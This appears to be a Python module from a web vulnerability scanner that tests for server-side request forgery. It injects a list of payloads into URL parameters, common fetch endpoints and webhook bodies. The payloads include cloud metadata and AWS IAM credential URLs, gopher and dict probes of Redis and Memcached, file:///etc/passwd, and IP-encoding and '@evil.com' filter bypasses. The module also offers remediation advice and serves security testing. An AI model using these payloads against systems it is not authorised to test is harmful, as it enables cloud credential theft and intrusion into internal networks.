"""
Server-Side Request Forgery (SSRF) Scanner
OWASP A10:2021 — Server-Side Request Forgery
CWE-918: Server-Side Request Forgery (SSRF)

Tests for:
  - SSRF via URL parameters
  - SSRF via file upload (URL-based fetch)
  - SSRF via webhooks / callback URLs
  - Blind SSRF (metadata endpoint probes)
  - AWS/GCP/Azure metadata endpoint access
  - Internal network probing
"""

import re
from .base import BaseScanner, Finding

# ── SSRF target URLs ──────────────────────────────────────────────────────────

# Cloud metadata endpoints (should never be accessible from the web)
METADATA_URLS = [
    ("http://169.254.169.254/latest/meta-data/", "AWS IMDSv1"),
    ("http://169.254.169.254/latest/user-data/", "AWS user-data"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM creds"),
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure IMDS"),
    ("http://100.100.100.200/latest/meta-data/", "Alibaba Cloud metadata"),
    ("http://192.168.0.1/", "Internal gateway"),
    ("http://10.0.0.1/", "Internal network"),
    ("http://127.0.0.1/", "Localhost"),
    ("http://localhost/", "Localhost alias"),
    ("http://0.0.0.0/", "Null route / loopback"),
    ("http://[::1]/", "IPv6 loopback"),
    ("dict://localhost:11211/", "Memcached probe"),
    ("gopher://localhost:6379/_INFO", "Redis probe"),
    ("file:///etc/passwd", "File read via SSRF"),
    ("http://169.254.169.254@evil.com/", "@ bypass"),
    ("http://2130706433/", "IP decimal bypass (127.0.0.1)"),
    ("http://0x7f000001/", "IP hex bypass (127.0.0.1)"),
    ("http://017700000001/", "IP octal bypass (127.0.0.1)"),
]

# URL parameters commonly used for SSRF
SSRF_PARAMS = [
    "url", "uri", "link", "src", "source", "href", "path", "redirect",
    "next", "target", "dest", "destination", "return", "returnUrl",
    "callback", "webhook", "fetch", "load", "image", "img", "file",
    "page", "content", "resource", "host", "domain", "proxy", "forward",
    "api", "endpoint", "site", "data", "ref",
]

# Response content that indicates a successful SSRF to metadata
METADATA_INDICATORS = {
    "AWS IMDSv1": ["ami-id", "instance-id", "placement", "local-ipv4"],
    "AWS user-data": ["#!/bin", "cloud-config", "user-data"],
    "AWS IAM creds": ["AccessKeyId", "SecretAccessKey", "Token"],
    "GCP metadata": ["computeMetadata", "project-id", "instance"],
    "Azure IMDS": ["compute", "subscriptionId", "resourceGroupName"],
    "Localhost": ["Server:", "Apache", "nginx", "IIS", "127.0.0.1"],
    "File read via SSRF": ["root:x:", "daemon:", "/bin/bash"],
}


def _detect_ssrf_in_response(resp_text: str, target_desc: str) -> bool:
    """Check if response contains content characteristic of the SSRF target."""
    indicators = METADATA_INDICATORS.get(target_desc, [])
    text_lower = resp_text.lower()
    return any(ind.lower() in text_lower for ind in indicators)


class SSRFScanner(BaseScanner):
    """Scans for Server-Side Request Forgery (SSRF) vulnerabilities."""

    SCANNER_NAME = "Server-Side Request Forgery (SSRF)"
    OWASP_CATEGORY = "A10:2021"
    CWE = "CWE-918"

    def run(self) -> list[Finding]:
        self.logger.info(f"Starting SSRF scan against {self.target}")

        # Test URL parameters on the target
        params = self.get_query_params(self.target)
        for param in params:
            if param.lower() in SSRF_PARAMS or any(s in param.lower() for s in SSRF_PARAMS):
                self._test_param_ssrf(self.target, param)

        # Test common vulnerable endpoints
        self._test_common_ssrf_endpoints()

        # Test webhook/fetch functionality
        self._test_webhook_ssrf()

        return self.findings

    def _test_param_ssrf(self, url: str, param: str):
        """Inject SSRF payloads into a URL parameter."""
        for ssrf_url, desc in METADATA_URLS[:8]:
            test_url = self.inject_param(url, param, ssrf_url)
            resp, evidence = self.http.get(test_url, allow_redirects=True)
            if resp is None:
                continue

            confirmed = _detect_ssrf_in_response(resp.text, desc)
            if confirmed or resp.status_code == 200:
                sev = "CRITICAL" if confirmed else "MEDIUM"
                cvss = 9.8 if confirmed else 5.8
                self.add_finding(Finding(
                    title=f"Server-Side Request Forgery (SSRF) — {desc}",
                    severity=sev,
                    owasp="A10:2021",
                    cwe="CWE-918",
                    cvss_score=cvss,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H" if confirmed
                               else "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
                    url=url,
                    parameter=param,
                    payload=ssrf_url,
                    description=(
                        f"Parameter `{param}` caused the server to issue a request to `{ssrf_url}` ({desc}). "
                        + ("Content characteristic of the target appeared in the response." if confirmed
                           else "Server returned HTTP 200 — manual verification recommended.")
                    ),
                    impact=(
                        "Cloud metadata access (AWS keys, GCP tokens), internal service enumeration, "
                        "lateral movement, RCE via internal admin interfaces, data exfiltration."
                    ),
                    remediation=(
                        "Never allow users to control server-side request URLs. "
                        "Use an allowlist of permitted destinations. "
                        "Block RFC-1918 / metadata IP ranges at the egress firewall. "
                        "Enforce IMDSv2 (AWS) / metadata-flavor header (GCP). "
                        "Validate and sanitize URL inputs server-side."
                    ),
                    references=[
                        "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/",
                        "https://portswigger.net/web-security/ssrf",
                        "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
                        "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html",
                    ],
                    evidence=evidence,
                    confirmed=confirmed,
                    vuln_type="ssrf",
                ))
                if confirmed:
                    return  # confirmed finding, stop this param

    def _test_common_ssrf_endpoints(self):
        """Test endpoints known to accept URL parameters."""
        endpoints_with_params = [
            f"{self.target}/fetch?url=",
            f"{self.target}/proxy?url=",
            f"{self.target}/redirect?url=",
            f"{self.target}/api/fetch?url=",
            f"{self.target}/load?src=",
            f"{self.target}/image?url=",
            f"{self.target}/screenshot?url=",
            f"{self.target}/share?url=",
            f"{self.target}/export?url=",
        ]
        for ep_base in endpoints_with_params:
            for ssrf_url, desc in METADATA_URLS[:4]:
                full_url = ep_base + ssrf_url
                resp, evidence = self.http.get(full_url, allow_redirects=True)
                if resp is None:
                    continue
                if resp.status_code in (200, 201) and _detect_ssrf_in_response(resp.text, desc):
                    self.add_finding(Finding(
                        title=f"SSRF via URL Parameter — {desc} Accessible",
                        severity="CRITICAL",
                        owasp="A10:2021",
                        cwe="CWE-918",
                        cvss_score=9.8,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                        url=ep_base.rstrip("="),
                        parameter="url",
                        payload=ssrf_url,
                        description=f"Endpoint fetches attacker-controlled URLs, reaching {desc}.",
                        impact="Cloud credential theft, internal service access, potential RCE.",
                        remediation="Implement URL allowlist. Block internal IP ranges.",
                        references=["https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/"],
                        evidence=evidence,
                        confirmed=True,
                        vuln_type="ssrf",
                    ))
                    return

    def _test_webhook_ssrf(self):
        """Test webhook/notification endpoints for SSRF via callback URLs."""
        webhook_endpoints = [
            f"{self.target}/api/webhook",
            f"{self.target}/webhook",
            f"{self.target}/notifications/callback",
            f"{self.target}/api/callback",
        ]
        for ep in webhook_endpoints:
            for ssrf_url, desc in [
                ("http://169.254.169.254/latest/meta-data/", "AWS IMDSv1"),
                ("http://localhost/", "Localhost"),
            ]:
                payloads = [
                    {"url": ssrf_url, "callback": ssrf_url, "webhook": ssrf_url},
                    {"endpoint": ssrf_url, "target": ssrf_url},
                ]
                for payload_dict in payloads:
                    resp, evidence = self.http.post(ep, json_data=payload_dict)
                    if resp is None:
                        continue
                    if resp.status_code in (200, 201, 202) and _detect_ssrf_in_response(resp.text, desc):
                        self.add_finding(Finding(
                            title="SSRF via Webhook Endpoint",
                            severity="CRITICAL",
                            owasp="A10:2021",
                            cwe="CWE-918",
                            cvss_score=9.8,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                            url=ep,
                            parameter=str(list(payload_dict.keys())),
                            payload=ssrf_url,
                            description=f"Webhook endpoint at `{ep}` issues server-side requests to attacker URLs.",
                            impact="Cloud metadata access, internal service scanning, credential theft.",
                            remediation="Validate and allowlist callback URLs. Use async verification tokens.",
                            references=["https://portswigger.net/web-security/ssrf"],
                            evidence=evidence,
                            confirmed=True,
                            vuln_type="ssrf",
                        ))
                        return
